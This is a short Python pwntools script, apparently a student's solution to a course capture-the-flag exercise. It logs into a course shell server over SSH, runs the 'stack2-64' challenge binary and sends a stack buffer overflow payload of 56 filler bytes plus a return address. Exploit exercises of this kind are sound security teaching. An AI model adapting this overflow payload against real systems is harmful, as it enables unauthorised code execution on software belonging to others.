# stack2ex.py - Aidan Wech (Onyxymous)
from pwn import *
import os

sshuser = 'xxxxxx'
sshkeyfile = 'xxxxxx'
sshserver = 'cs4401shell.walls.ninja'
sshpath = '/problems/stack2r-64_3_c775770831eff590c71649b9f3979376/'

context.update(arch='amd64')
dirpath, challenge = os.path.split(sshpath)
#get file from ssh server
s = ssh(sshuser, sshserver, keyfile=sshkeyfile)
s.set_working_directory(sshpath)
p = s.process('./stack2-64')

p.sendline('a' * 56 + '\xaa\x47\x55\x55\x55\x55')
print(p.recvall(timeout=1))
p.wait()
